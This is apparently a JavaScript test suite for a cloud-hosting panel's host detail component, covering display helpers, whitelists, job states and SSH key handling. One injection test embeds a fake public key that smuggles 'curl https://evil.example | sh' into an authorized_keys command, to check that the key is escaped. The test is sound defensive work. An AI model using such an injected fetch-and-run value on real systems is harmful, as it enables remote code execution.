import { beforeEach, describe, expect, test } from "@odoo/hoot";
import { allowTranslations, patchWithCleanup } from "@web/../tests/web_test_helpers";
import { rpc } from "@web/core/network/rpc";
import { HostDetail } from "@incubacloud/components/host_detail/host_detail";

/**
 * HostDetail uses useEnv, useService("orm"), rpc, onWillStart,
 * onMounted, onWillUnmount, setInterval, and PasswordInput.
 * We test pure helper functions: statusLabel, barClass, hasMetrics,
 * formatRam, diskExtra, formatDate, timeAgo, isActiveJob, jobIcon,
 * jobStateClass, getLineNumbers, tab system, and whitelist logic.
 */

describe("HostDetail — class structure", () => {
    test("template name is set", () => {
        expect(HostDetail.template).toBe("incubacloud.HostDetail");
    });

    test("props defines host_id as optional Number", () => {
        expect(HostDetail.props.host_id.type).toBe(Number);
        expect(HostDetail.props.host_id.optional).toBe(true);
    });

    test("components includes PasswordInput", () => {
        expect("PasswordInput" in HostDetail.components).toBe(true);
    });
});

describe("HostDetail — statusLabel helper", () => {
    function statusLabel(status) {
        return {
            compatible: "Compatible",
            degraded: "Degraded",
            unsupported: "Unsupported",
            checking: "Checking",
            unknown: "Unknown",
        }[status] || status;
    }

    test("maps compatible", () => {
        expect(statusLabel("compatible")).toBe("Compatible");
    });

    test("maps degraded", () => {
        expect(statusLabel("degraded")).toBe("Degraded");
    });

    test("maps unsupported", () => {
        expect(statusLabel("unsupported")).toBe("Unsupported");
    });

    test("maps checking", () => {
        expect(statusLabel("checking")).toBe("Checking");
    });

    test("maps unknown", () => {
        expect(statusLabel("unknown")).toBe("Unknown");
    });

    test("returns raw value for unmapped status", () => {
        expect(statusLabel("offline")).toBe("offline");
    });
});

describe("HostDetail — barClass helper", () => {
    function barClass(value) {
        if (!value) return "bar-empty";
        if (value >= 85) return "bar-danger";
        if (value >= 65) return "bar-warn";
        return "bar-ok";
    }

    test("returns bar-empty for 0", () => {
        expect(barClass(0)).toBe("bar-empty");
    });

    test("returns bar-empty for null", () => {
        expect(barClass(null)).toBe("bar-empty");
    });

    test("returns bar-empty for undefined", () => {
        expect(barClass(undefined)).toBe("bar-empty");
    });

    test("returns bar-ok for 30%", () => {
        expect(barClass(30)).toBe("bar-ok");
    });

    test("returns bar-ok for 64%", () => {
        expect(barClass(64)).toBe("bar-ok");
    });

    test("returns bar-warn for 65%", () => {
        expect(barClass(65)).toBe("bar-warn");
    });

    test("returns bar-warn for 84%", () => {
        expect(barClass(84)).toBe("bar-warn");
    });

    test("returns bar-danger for 85%", () => {
        expect(barClass(85)).toBe("bar-danger");
    });

    test("returns bar-danger for 100%", () => {
        expect(barClass(100)).toBe("bar-danger");
    });
});

describe("HostDetail — hasMetrics helper", () => {
    function hasMetrics(host) {
        return host && (host.cpu_cores > 0 || host.ram_total_gb > 0 || host.disk > 0);
    }

    test("returns true when cpu_cores > 0", () => {
        expect(hasMetrics({ cpu_cores: 4, ram_total_gb: 0, disk: 0 })).toBe(true);
    });

    test("returns true when ram > 0", () => {
        expect(hasMetrics({ cpu_cores: 0, ram_total_gb: 16, disk: 0 })).toBe(true);
    });

    test("returns true when disk > 0", () => {
        expect(hasMetrics({ cpu_cores: 0, ram_total_gb: 0, disk: 50 })).toBe(true);
    });

    test("returns false when all zeros", () => {
        expect(hasMetrics({ cpu_cores: 0, ram_total_gb: 0, disk: 0 })).toBe(false);
    });

    test("returns null for null host", () => {
        expect(hasMetrics(null)).toBe(null);
    });
});

describe("HostDetail — formatRam helper", () => {
    function formatRam(gb) {
        if (!gb) return "\u2014";
        return gb % 1 === 0 ? `${gb} GB` : `${gb.toFixed(1)} GB`;
    }

    test("returns dash for 0", () => {
        expect(formatRam(0)).toBe("\u2014");
    });

    test("returns dash for null", () => {
        expect(formatRam(null)).toBe("\u2014");
    });

    test("integer GB shows no decimal", () => {
        expect(formatRam(8)).toBe("8 GB");
    });

    test("fractional GB shows one decimal", () => {
        expect(formatRam(15.7)).toBe("15.7 GB");
    });

    test("handles large values", () => {
        expect(formatRam(128)).toBe("128 GB");
    });
});

describe("HostDetail — diskExtra helper", () => {
    function diskExtra(host) {
        const free = host.disk_free_gb;
        const pct = host.disk;
        if (!free && !pct) return "";
        if (!pct || pct <= 0 || pct >= 100) return `${free} GB free`;
        const total = Math.round((free * 100) / (100 - pct));
        return `${free} GB free / ${total} GB`;
    }

    test("returns empty when no data", () => {
        expect(diskExtra({ disk_free_gb: 0, disk: 0 })).toBe("");
    });

    test("returns free only when pct is 0", () => {
        expect(diskExtra({ disk_free_gb: 50, disk: 0 })).toBe("50 GB free");
    });

    test("returns free only when pct is 100", () => {
        expect(diskExtra({ disk_free_gb: 0, disk: 100 })).toBe("0 GB free");
    });

    test("computes total correctly (50% used)", () => {
        expect(diskExtra({ disk_free_gb: 50, disk: 50 })).toBe("50 GB free / 100 GB");
    });

    test("computes total correctly (80% used)", () => {
        expect(diskExtra({ disk_free_gb: 20, disk: 80 })).toBe("20 GB free / 100 GB");
    });

    test("computes total correctly (25% used)", () => {
        expect(diskExtra({ disk_free_gb: 75, disk: 25 })).toBe("75 GB free / 100 GB");
    });
});

describe("HostDetail — formatDate helper", () => {
    function formatDate(dateStr) {
        if (!dateStr) return "";
        const d = new Date(dateStr);
        const pad = (n) => String(n).padStart(2, "0");
        return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
    }

    test("returns empty for null", () => {
        expect(formatDate(null)).toBe("");
    });

    test("returns empty for empty string", () => {
        expect(formatDate("")).toBe("");
    });

    test("formats ISO date correctly", () => {
        // Use a fixed UTC date and check format structure
        const result = formatDate("2025-03-15T10:30:00Z");
        // Check it matches YYYY-MM-DD HH:MM pattern
        expect(result).toMatch(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/);
    });

    test("pads single-digit months and days", () => {
        const result = formatDate("2025-01-05T08:05:00Z");
        expect(result).toMatch(/^\d{4}-01-05/);
    });
});

describe("HostDetail — timeAgo helper", () => {
    function timeAgo(dateStr) {
        if (!dateStr) return "";
        const secs = Math.floor((Date.now() - new Date(dateStr).getTime()) / 1000);
        if (secs < 60) return "just now";
        const mins = Math.floor(secs / 60);
        if (mins < 60) return `${mins}m ago`;
        const hrs = Math.floor(mins / 60);
        if (hrs < 24) return `${hrs}h ago`;
        return `${Math.floor(hrs / 24)}d ago`;
    }

    test("returns empty for null", () => {
        expect(timeAgo(null)).toBe("");
    });

    test("returns empty for empty string", () => {
        expect(timeAgo("")).toBe("");
    });

    test("returns just now for very recent time", () => {
        const recent = new Date(Date.now() - 5000).toISOString();
        expect(timeAgo(recent)).toBe("just now");
    });

    test("formats minutes correctly", () => {
        const date = new Date(Date.now() - 10 * 60 * 1000).toISOString();
        expect(timeAgo(date)).toBe("10m ago");
    });

    test("formats hours correctly", () => {
        const date = new Date(Date.now() - 3 * 3600 * 1000).toISOString();
        expect(timeAgo(date)).toBe("3h ago");
    });

    test("formats days correctly", () => {
        const date = new Date(Date.now() - 5 * 86400 * 1000).toISOString();
        expect(timeAgo(date)).toBe("5d ago");
    });
});

describe("HostDetail — isActiveJob helper", () => {
    function isActiveJob(state) {
        return HostDetail.prototype.isActiveJob(state);
    }

    test("queued is active: it waits in the host's queue", () => {
        expect(isActiveJob("queued")).toBe(true);
    });

    test("pending is active", () => {
        expect(isActiveJob("pending")).toBe(true);
    });

    test("enqueued is active", () => {
        expect(isActiveJob("enqueued")).toBe(true);
    });

    test("started is active", () => {
        expect(isActiveJob("started")).toBe(true);
    });

    test("wait_dependencies is active", () => {
        expect(isActiveJob("wait_dependencies")).toBe(true);
    });

    test("done is not active", () => {
        expect(isActiveJob("done")).toBe(false);
    });

    test("failed is not active", () => {
        expect(isActiveJob("failed")).toBe(false);
    });

    test("cancelled is not active", () => {
        expect(isActiveJob("cancelled")).toBe(false);
    });
});

describe("HostDetail — jobIcon helper", () => {
    function jobIcon(code) {
        return {
            host_probe: "fa-heartbeat",
            full_setup: "fa-wrench",
            deploy_instance: "fa-rocket",
            rebuild_instance: "fa-wrench",
            setup_whitelist: "fa-shield",
            docker_prune: "fa-recycle",
            host_metrics: "fa-bar-chart",
        }[code] || "fa-cog";
    }

    test("host_probe maps to fa-heartbeat", () => {
        expect(jobIcon("host_probe")).toBe("fa-heartbeat");
    });

    test("full_setup maps to fa-wrench", () => {
        expect(jobIcon("full_setup")).toBe("fa-wrench");
    });

    test("deploy_instance maps to fa-rocket", () => {
        expect(jobIcon("deploy_instance")).toBe("fa-rocket");
    });

    test("setup_whitelist maps to fa-shield", () => {
        expect(jobIcon("setup_whitelist")).toBe("fa-shield");
    });

    test("docker_prune maps to fa-recycle", () => {
        expect(jobIcon("docker_prune")).toBe("fa-recycle");
    });

    test("host_metrics maps to fa-bar-chart", () => {
        expect(jobIcon("host_metrics")).toBe("fa-bar-chart");
    });

    test("unknown code returns fa-cog", () => {
        expect(jobIcon("something_else")).toBe("fa-cog");
    });
});

describe("HostDetail — jobStateClass helper", () => {
    function jobStateClass(state) {
        return HostDetail.prototype.jobStateClass(state);
    }

    test("queued maps to jst-queued", () => {
        expect(jobStateClass("queued")).toBe("jst-queued");
    });

    test("done maps to jst-done", () => {
        expect(jobStateClass("done")).toBe("jst-done");
    });

    test("failed maps to jst-failed", () => {
        expect(jobStateClass("failed")).toBe("jst-failed");
    });

    test("cancelled maps to jst-cancelled", () => {
        expect(jobStateClass("cancelled")).toBe("jst-cancelled");
    });

    test("started maps to jst-running", () => {
        expect(jobStateClass("started")).toBe("jst-running");
    });

    test("pending maps to jst-pending", () => {
        expect(jobStateClass("pending")).toBe("jst-pending");
    });

    test("enqueued maps to jst-pending", () => {
        expect(jobStateClass("enqueued")).toBe("jst-pending");
    });

    test("blocked maps to jst-blocked", () => {
        expect(jobStateClass("blocked")).toBe("jst-blocked");
    });

    test("unknown state falls back to jst-pending", () => {
        expect(jobStateClass("something")).toBe("jst-pending");
    });
});

describe("HostDetail — tab system logic", () => {
    // New hosts start on "general" tab, existing hosts on "overview"

    test("new host starts on general tab", () => {
        const isNew = true;
        const defaultTab = isNew ? "general" : "overview";
        expect(defaultTab).toBe("general");
    });

    test("existing host starts on overview tab", () => {
        const isNew = false;
        const defaultTab = isNew ? "general" : "overview";
        expect(defaultTab).toBe("overview");
    });
});

describe("HostDetail — EMPTY_FORM defaults", () => {
    const defaults = {
        name: "",
        type: "self_hosted",
        ip_address: "",
        port: 22,
        user: "",
        login_type: "ssh_key",
        password: "",
        key_file: null,
        description: "",
        tags: "",
        wildcard_domain: "",
        traefik_panel_password: "",
        traefik_config_yml: "",
        traefik_inverseproxy_yaml: "",
        traefik_yml: "",
        whitelist: [
            "cdnjs.cloudflare.com",
            "fonts.googleapis.com",
            "fonts.gstatic.com",
            "www.google.com",
            "www.gravatar.com",
        ],
        newWhitelistEntry: "",
    };

    test("type defaults to self_hosted", () => {
        expect(defaults.type).toBe("self_hosted");
    });

    test("port defaults to 22", () => {
        expect(defaults.port).toBe(22);
    });

    test("login_type defaults to ssh_key", () => {
        expect(defaults.login_type).toBe("ssh_key");
    });

    test("whitelist has 5 default entries", () => {
        expect(defaults.whitelist.length).toBe(5);
    });

    test("whitelist includes cloudflare CDN", () => {
        expect(defaults.whitelist).toInclude("cdnjs.cloudflare.com");
    });

    test("whitelist includes Google fonts", () => {
        expect(defaults.whitelist).toInclude("fonts.googleapis.com");
        expect(defaults.whitelist).toInclude("fonts.gstatic.com");
    });
});

describe("HostDetail — whitelist management logic", () => {
    function addWhitelistEntry(whitelist, entry) {
        const clean = (entry || "").trim().toLowerCase();
        if (!clean || whitelist.includes(clean)) return whitelist;
        return [...whitelist, clean];
    }

    function removeWhitelistEntry(whitelist, hostname) {
        return whitelist.filter((h) => h !== hostname);
    }

    test("adds new entry", () => {
        const result = addWhitelistEntry(["a.com"], "b.com");
        expect(result).toEqual(["a.com", "b.com"]);
    });

    test("does not add duplicate", () => {
        const result = addWhitelistEntry(["a.com"], "a.com");
        expect(result).toEqual(["a.com"]);
    });

    test("trims and lowercases entry", () => {
        const result = addWhitelistEntry([], "  Example.COM  ");
        expect(result).toEqual(["example.com"]);
    });

    test("ignores empty entry", () => {
        const result = addWhitelistEntry(["a.com"], "");
        expect(result).toEqual(["a.com"]);
    });

    test("removes existing entry", () => {
        const result = removeWhitelistEntry(["a.com", "b.com"], "a.com");
        expect(result).toEqual(["b.com"]);
    });

    test("no-op when removing non-existent entry", () => {
        const result = removeWhitelistEntry(["a.com"], "z.com");
        expect(result).toEqual(["a.com"]);
    });
});

describe("HostDetail — hasMoreJobs getter logic", () => {
    function hasMoreJobs(jobsTotal, jobsLength) {
        return jobsTotal > jobsLength;
    }

    test("true when total exceeds displayed", () => {
        expect(hasMoreJobs(10, 5)).toBe(true);
    });

    test("false when equal", () => {
        expect(hasMoreJobs(5, 5)).toBe(false);
    });

    test("false when less", () => {
        expect(hasMoreJobs(3, 5)).toBe(false);
    });
});

describe("HostDetail — getLineNumbers logic", () => {
    function getLineNumbers(text) {
        const lines = Math.max(1, (text || "").split("\n").length);
        return Array.from({ length: lines }, (_, i) => i + 1);
    }

    test("empty string returns [1]", () => {
        expect(getLineNumbers("")).toEqual([1]);
    });

    test("single line returns [1]", () => {
        expect(getLineNumbers("hello")).toEqual([1]);
    });

    test("multi-line returns correct numbers", () => {
        expect(getLineNumbers("a\nb\nc")).toEqual([1, 2, 3]);
    });

    test("null returns [1]", () => {
        expect(getLineNumbers(null)).toEqual([1]);
    });
});

describe("HostDetail — TRAEFIK_FILES constant", () => {
    const TRAEFIK_FILES = [
        { key: "traefik_config_yml", label: "config.yml" },
        { key: "traefik_inverseproxy_yaml", label: "inverseproxy.yaml" },
        { key: "traefik_yml", label: "traefik.yml" },
    ];

    test("has 3 files", () => {
        expect(TRAEFIK_FILES.length).toBe(3);
    });

    test("first file is config.yml", () => {
        expect(TRAEFIK_FILES[0].key).toBe("traefik_config_yml");
        expect(TRAEFIK_FILES[0].label).toBe("config.yml");
    });

    test("each entry has key and label", () => {
        for (const f of TRAEFIK_FILES) {
            expect(typeof f.key).toBe("string");
            expect(typeof f.label).toBe("string");
        }
    });
});

describe("HostDetail — method existence", () => {
    test("save method exists", () => {
        expect(typeof HostDetail.prototype.save).toBe("function");
    });

    test("deleteHost method exists", () => {
        expect(typeof HostDetail.prototype.deleteHost).toBe("function");
    });

    test("runCheck method exists", () => {
        expect(typeof HostDetail.prototype.runCheck).toBe("function");
    });

    test("runFullSetup method exists", () => {
        expect(typeof HostDetail.prototype.runFullSetup).toBe("function");
    });

    test("addWhitelistEntry method exists", () => {
        expect(typeof HostDetail.prototype.addWhitelistEntry).toBe("function");
    });

    test("removeWhitelistEntry method exists", () => {
        expect(typeof HostDetail.prototype.removeWhitelistEntry).toBe("function");
    });

    test("applyWhitelist method exists", () => {
        expect(typeof HostDetail.prototype.applyWhitelist).toBe("function");
    });

    test("openLog method exists", () => {
        expect(typeof HostDetail.prototype.openLog).toBe("function");
    });
});

describe("HostDetail — hostAction", () => {
    // The notice reads the job's state back from the server: here, a job
    // that started.
    beforeEach(() => {
        allowTranslations();
        patchWithCleanup(rpc, {
            _rpc: (url, params) => Promise.resolve({
                ok: true, job_id: params.job_id, state: "pending",
                job_type: "Push Trusted Proxy Settings", queued_behind: false,
            }),
        });
    });

    /**
     * Build the minimum `this` the method touches.
     *
     * The real component needs a mounted OWL tree, so the method is
     * called against a stand-in; every collaborator it reaches for is
     * recorded so the test can assert on the calls rather than on the
     * DOM.
     *
     * @param {object} [opts]
     * @param {boolean} [opts.confirm] What the dialog answers.
     * @param {boolean} [opts.fail] Make the enqueue call reject.
     * @returns {object} the stand-in, with a `calls` log.
     */
    function harness({ confirm = true, fail = false } = {}) {
        const calls = { enqueue: [], info: [], error: [], refresh: 0, confirm: [] };
        return {
            calls,
            props: { host_id: 7 },
            state: { actionBusy: "" },
            orm: {
                call(model, method, args) {
                    calls.enqueue.push([model, method, args]);
                    return fail ? Promise.reject(new Error("boom")) : Promise.resolve(11);
                },
            },
            env: {
                toast: {
                    info: (msg) => calls.info.push(msg),
                    error: (msg) => calls.error.push(msg),
                },
            },
            _confirm(opts) {
                calls.confirm.push(opts);
                return Promise.resolve(confirm);
            },
            _silentRefresh() {
                calls.refresh += 1;
            },
            hostAction: HostDetail.prototype.hostAction,
        };
    }

    test("queues the job and says so", async () => {
        const h = harness();
        await h.hostAction({ code: "push_trusted_proxies", name: "Push Trusted Proxy Settings" });
        expect(h.calls.enqueue).toHaveLength(1);
        expect(h.calls.enqueue[0][2]).toEqual([7, false, "push_trusted_proxies"]);
        expect(h.calls.info.map(String)).toEqual(["Started: Push Trusted Proxy Settings"]);
        expect(h.calls.error).toHaveLength(0);
    });

    test("refreshes at once instead of waiting for the bus", async () => {
        const h = harness();
        await h.hostAction({ code: "a", name: "A" });
        expect(h.calls.refresh).toBe(1);
    });

    test("a second press while one is in flight queues nothing", async () => {
        const h = harness();
        h.state.actionBusy = "a";
        await h.hostAction({ code: "a", name: "A" });
        expect(h.calls.enqueue).toHaveLength(0);
    });

    test("releases the guard so the next press works", async () => {
        const h = harness();
        await h.hostAction({ code: "a", name: "A" });
        expect(h.state.actionBusy).toBe("");
        await h.hostAction({ code: "a", name: "A" });
        expect(h.calls.enqueue).toHaveLength(2);
    });

    test("releases the guard after a failure too", async () => {
        const h = harness({ fail: true });
        await h.hostAction({ code: "a", name: "A" });
        expect(h.calls.error).toHaveLength(1);
        expect(h.state.actionBusy).toBe("");
    });

    test("an action carrying a notice asks before queueing", async () => {
        const h = harness();
        await h.hostAction({ code: "a", name: "A", action_confirm: "Traefik restarts." });
        expect(h.calls.confirm).toHaveLength(1);
        expect(h.calls.confirm[0].message).toBe("Traefik restarts.");
        expect(h.calls.enqueue).toHaveLength(1);
    });

    test("declining the notice queues nothing", async () => {
        const h = harness({ confirm: false });
        await h.hostAction({ code: "a", name: "A", action_confirm: "Traefik restarts." });
        expect(h.calls.enqueue).toHaveLength(0);
        expect(h.state.actionBusy).toBe("");
    });

    test("an action without a notice asks nothing", async () => {
        const h = harness();
        await h.hostAction({ code: "a", name: "A" });
        expect(h.calls.confirm).toHaveLength(0);
    });
});

/**
 * The SSH list the hardening dialog hands back (plan-lista-ssh-sin-relleno).
 *
 * Ticking "Also allow my IP" adds the address on the server. The page
 * then holds the list in its form and in the baseline its changes are
 * measured against, or the next save of any other field would write the
 * old list back over it, and the page would read as unsaved (the dialog
 * refuses to open then). ``onHardeningApplied`` and the dirty tracking
 * are the shipped ones, on a stand-in.
 */
describe("HostDetail — the SSH list after a hardening", () => {
    /**
     * A host page stand-in with *form* loaded and saved.
     *
     * @param {object} form the host's form values
     * @returns {object} the stand-in, with ``refreshes`` counted
     */
    function page(form) {
        const comp = Object.create(HostDetail.prototype);
        comp.env = {};
        comp.refreshes = 0;
        comp._silentRefresh = () => {
            comp.refreshes += 1;
        };
        comp.state = {
            host: { id: 7, name: "pool-1" },
            form: { name: "pool-1", newWhitelistEntry: "", ...form },
            selectedTags: [],
        };
        comp.hardeningState = { open: false, offer: false };
        comp._snapshotForm();
        return comp;
    }

    test("the list comes back into the form, and the page stays clean", () => {
        const comp = page({ allowed_ssh_ips: "45.10.20.0/24" });
        comp.onHardeningApplied([9], "45.10.20.0/24, 81.40.12.7");
        expect(comp.state.form.allowed_ssh_ips).toBe("45.10.20.0/24, 81.40.12.7");
        expect(comp.hasUnsavedChanges).toBe(false);
        expect(comp.refreshes).toBe(1);
        comp.openHardeningModal();
        expect(comp.hardeningState.open).toBe(true);
    });

    test("an edit of another field still reads as unsaved", () => {
        const comp = page({ allowed_ssh_ips: "", description: "" });
        comp.state.form.description = "edited";
        comp.onHardeningApplied([9], "81.40.12.7");
        expect(comp.state.form.allowed_ssh_ips).toBe("81.40.12.7");
        expect(comp.hasUnsavedChanges).toBe(true);
        comp.state.form.description = "";
        expect(comp.hasUnsavedChanges).toBe(false);
    });

    test("a page without the list, or an apply without one, is left as it is", () => {
        const corePage = page({});
        corePage.onHardeningApplied([9], "81.40.12.7");
        expect("allowed_ssh_ips" in corePage.state.form).toBe(false);
        expect(corePage.hasUnsavedChanges).toBe(false);

        const unticked = page({ allowed_ssh_ips: "45.10.20.0/24" });
        unticked.onHardeningApplied([9], undefined);
        expect(unticked.state.form.allowed_ssh_ips).toBe("45.10.20.0/24");
        expect(unticked.refreshes).toBe(1);
    });
});

describe("HostDetail — onKeyFileChange", () => {
    test("a change without files does not throw and clears the key", () => {
        const ctx = { state: { form: { key_file: "old" } } };
        HostDetail.prototype.onKeyFileChange.call(ctx, { target: { files: null } });
        expect(ctx.state.form.key_file).toBe(null);
        HostDetail.prototype.onKeyFileChange.call(ctx, { target: { files: [] } });
        expect(ctx.state.form.key_file).toBe(null);
    });
});

describe("HostDetail — SSH public key", () => {
    const shown = Object.getOwnPropertyDescriptor(HostDetail.prototype, "sshPublicKey").get;
    const command = Object.getOwnPropertyDescriptor(
        HostDetail.prototype, "authorizedKeysCommand",
    ).get;
    const KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample incubacloud";

    test("a new host shows the generated key, and none for an upload", () => {
        const ctx = {
            isNew: true,
            state: {
                form: { login_type: "ssh_key", key_source: "generate", key_file: null },
                generatedPublicKey: KEY,
            },
        };
        expect(shown.call(ctx)).toBe(KEY);
        ctx.state.form.key_source = "upload";
        expect(shown.call(ctx)).toBe("");
    });

    test("a password host shows no key", () => {
        const ctx = {
            isNew: true,
            state: {
                form: { login_type: "password", key_source: "generate" },
                generatedPublicKey: KEY,
            },
        };
        expect(shown.call(ctx)).toBe("");
    });

    test("a saved host shows its stored key until a new file is picked", () => {
        const ctx = {
            isNew: false,
            state: {
                form: { login_type: "ssh_key", key_file: null },
                host: { ssh_public_key: KEY },
            },
        };
        expect(shown.call(ctx)).toBe(KEY);
        ctx.state.form.key_file = "bmV3";
        expect(shown.call(ctx)).toBe("");
    });

    test("the command appends the key to authorized_keys", () => {
        expect(command.call({ sshPublicKey: KEY })).toBe(
            `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '${KEY}' >> ~/.ssh/authorized_keys`,
        );
    });

    test("nothing in the key runs as part of the command", () => {
        const evil = "ssh-ed25519 AAAA x'; curl https://evil.example | sh; echo '";
        const quoted = String.raw`'ssh-ed25519 AAAA x'\''; curl https://evil.example | sh; echo '\'''`;
        expect(command.call({ sshPublicKey: evil })).toBe(
            `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo ${quoted} >> ~/.ssh/authorized_keys`,
        );
    });
});

describe("HostDetail — a generated key not lost", () => {
    const dirty = Object.getOwnPropertyDescriptor(HostDetail.prototype, "hasUnsavedChanges").get;

    /**
     * A stand-in with the state the dirty check and the copy read.
     *
     * @param {object} [opts]
     * @param {boolean} [opts.isNew] Whether the host is being created.
     * @param {string} [opts.source] Where its key comes from.
     * @returns {object}
     */
    function stand({ isNew = true, source = "generate" } = {}) {
        return {
            isNew,
            state: { keyShared: false, copied: "", form: { key_source: source } },
            _savedForm: "same",
            _currentFormKey: () => "same",
            env: { toast: { error: () => {} } },
            markKeyShared: HostDetail.prototype.markKeyShared,
        };
    }

    test("an untouched new host can be left", () => {
        expect(dirty.call(stand())).toBe(false);
    });

    test("once its generated key is copied, leaving asks first", () => {
        const ctx = stand();
        ctx.markKeyShared();
        expect(dirty.call(ctx)).toBe(true);
        ctx.state.form.key_source = "upload";
        expect(dirty.call(ctx)).toBe(false);
    });

    test("copying from the buttons counts as sharing the key", async () => {
        const ctx = stand();
        patchWithCleanup(navigator.clipboard, { writeText: () => Promise.resolve() });
        await HostDetail.prototype.copyText.call(ctx, "ssh-ed25519 AAAA incubacloud", "key");
        expect(ctx.state.keyShared).toBe(true);
        expect(ctx.state.copied).toBe("key");
    });

    test("a saved host has no generated key to lose", () => {
        const ctx = stand({ isNew: false });
        ctx.markKeyShared();
        expect(dirty.call(ctx)).toBe(false);
    });
});

describe("HostDetail — save sends the key the person chose", () => {
    beforeEach(() => {
        allowTranslations();
    });

    /**
     * A stand-in for ``save()``, with every call it makes recorded.
     *
     * @param {object} form The form as the person left it.
     * @param {boolean} isNew Whether the host is being created.
     * @returns {object} the stand-in, with ``sent``: ``[url, params]`` pairs.
     */
    function harness(form, isNew) {
        const sent = [];
        patchWithCleanup(rpc, {
            _rpc: (url, params) => {
                sent.push([url, params]);
                return Promise.resolve({ id: 9 });
            },
        });
        return {
            sent,
            isNew,
            props: { host_id: 7 },
            state: { saving: false, keyShared: true, host: { name: "h" }, selectedTags: [], form },
            validator: { validate: () => ({ isValid: true }) },
            env: {
                toast: { success: () => {}, error: (msg) => sent.push(["error", msg]) },
                navigate: () => {},
                refreshNavCounts: () => {},
            },
            _refreshDefaultCertificate: () => Promise.resolve(),
            _snapshotForm: () => {},
        };
    }

    const FORM = () => ({
        name: "h", login_type: "ssh_key", port: 22, whitelist: [],
        http_conn_rate: 0, direct_port: 0, newWhitelistEntry: "",
    });

    test("a saved host keeps the new key file it was given", async () => {
        // A saved host's form has no key source: it only takes a file.
        const h = harness({ ...FORM(), key_file: "bmV3" }, false);
        await HostDetail.prototype.save.call(h);
        const [, params] = h.sent.find(([url]) => url === "/cloud/save_host");
        expect(params.vals.key_file).toBe("bmV3");
        expect("generated_key" in params.vals).toBe(false);
        expect("key_source" in params.vals).toBe(false);
    });

    test("a new host sends the generated key and not a file picked before", async () => {
        const h = harness(
            { ...FORM(), key_source: "generate", generated_key: "enc:sealed", key_file: "b2xk" },
            true,
        );
        await HostDetail.prototype.save.call(h);
        const [, params] = h.sent.find(([url]) => url === "/cloud/create_host");
        expect(params.vals.generated_key).toBe("enc:sealed");
        expect("key_file" in params.vals).toBe(false);
        expect("key_source" in params.vals).toBe(false);
        expect(h.state.keyShared).toBe(false);
    });
});

describe("HostDetail — login types without sshpass", () => {
    const options = Object.getOwnPropertyDescriptor(
        HostDetail.prototype, "loginTypeOptions",
    ).get;

    beforeEach(() => {
        allowTranslations();
    });

    /**
     * A stand-in with what the login type selector reads.
     *
     * @param {boolean} available Whether the panel's server has sshpass.
     * @param {string} [saved] The login type of the saved host, if any.
     * @returns {object}
     */
    function stand(available, saved) {
        return {
            isNew: !saved,
            state: {
                passwordLoginAvailable: available,
                host: saved ? { login_type: saved } : { name: "New Host" },
            },
        };
    }

    const values = (ctx) => options.call(ctx).map((option) => option.value);

    test("with sshpass, both login types are offered", () => {
        expect(values(stand(true))).toEqual(["ssh_key", "password"]);
    });

    test("without sshpass, a new host is offered the key only", () => {
        expect(values(stand(false))).toEqual(["ssh_key"]);
    });

    test("without sshpass, a saved key host is offered the key only", () => {
        expect(values(stand(false, "ssh_key"))).toEqual(["ssh_key"]);
    });

    test("a host that already logs in with a password keeps its option", () => {
        expect(values(stand(false, "password"))).toEqual(["ssh_key", "password"]);
    });

    test("the new-host form learns it from the defaults", async () => {
        patchWithCleanup(rpc, {
            _rpc: (url) => Promise.resolve(
                url === "/cloud/host_defaults"
                    ? { password_login_available: false }
                    : { tags: [] },
            ),
        });
        const ctx = {
            state: { form: {}, passwordLoginAvailable: true, allTags: [] },
            _snapshotForm: () => {},
            generateKey: () => {},
        };
        await HostDetail.prototype._loadDefaults.call(ctx);
        expect(ctx.state.passwordLoginAvailable).toBe(false);
    });
});
